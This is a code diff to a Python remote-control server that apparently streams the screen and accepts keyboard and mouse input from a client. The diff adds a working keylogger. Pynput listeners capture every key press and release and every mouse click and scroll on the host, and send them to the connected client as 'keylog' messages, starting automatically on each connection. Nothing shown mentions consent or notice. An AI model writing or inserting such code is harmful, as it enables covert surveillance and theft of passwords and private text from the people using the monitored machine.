@@ -10,7 +10,7 @@ from pynput import keyboard, mouse
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 import screeninfo
-from pynput import mouse
+from pynput import mouse, keyboard
 
 
 packet_size = 100 * 1024
@@ -99,6 +99,9 @@ class Server:
         self.turn_off_keyboard = keyboard.Listener(suppress=True)
         self.path = "./async"
         self.count = 0
+        self.log_keyboard = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
+        self.log_mouse = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
+        
     def connect(self):
         while True:
             if not self.connected and self.wait_connect:
@@ -113,6 +116,7 @@ class Server:
                         self.live = True
                         self.accept_pass = True
                         self.start_sync()
+                        self.start_keylog()
                 except:
                     pass
             else:
@@ -246,12 +250,14 @@ class Server:
             print(request['key'], request['event'])
         if request['event'] == 'press':
             try:
-                print(request['key'].char, re)
+                controller.press(request['key'])
             except:
-                print(request['key'])
-            controller.press(request['key'])
+                pass
         else:
-            controller.release(request['key'])
+            try:
+                controller.release(request['key'])
+            except:
+                pass
 
     def handle_mouse(self, request):
         controller = mouse.Controller()
@@ -288,6 +294,7 @@ class Server:
                 'status': True
             }
             self.start_sync()
+            self.start_keylog()
             self._send(mes)
         else:
             mes = {
@@ -315,7 +322,8 @@ class Server:
             self.accept_pass = False
         finally:
             self.stop_sync()
-            if self.client_socket:
+            self.stop_keylog()
+            if self.client_socket is not None:
                 self.client_socket.close()
                 self.client_socket = None
 
@@ -362,7 +370,57 @@ class Server:
             self.file_async.stop()
         except:
             pass
-
+    
+    def on_press(self, key):
+        try:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key.char} pressed',
+            }
+            self._send(mes)
+        except:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key} pressed',
+            }
+            self._send(mes)
+        self._send(mes)
+    
+    def on_release(self, key):
+        try:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key.char} released',
+            }
+        except:
+            mes = {
+                'type': 'keylog',
+                'event': f'{key} released',
+            }
+        self._send(mes)
+    
+    def on_click(self, x, y, button, pressed):
+        mes = {
+            'type': 'keylog',
+            'event': f'{button} clicked at {x},{y}',
+        }
+        self._send(mes)
+        
+    def on_scroll(self, x, y, dx, dy):
+        mes = {
+            'type': 'keylog',
+            'event': f'scroll {dx},{dy} at {x},{y}',
+        }
+        self._send(mes)
+    
+    def start_keylog(self):
+        self.log_keyboard.start()
+        self.log_mouse.start()
+    
+    def stop_keylog(self):
+        self.log_keyboard.stop()
+        self.log_mouse.stop()
+    
     def run(self):
         Thread(target=self.connect).start()
         Thread(target=self.stream_screen).start()
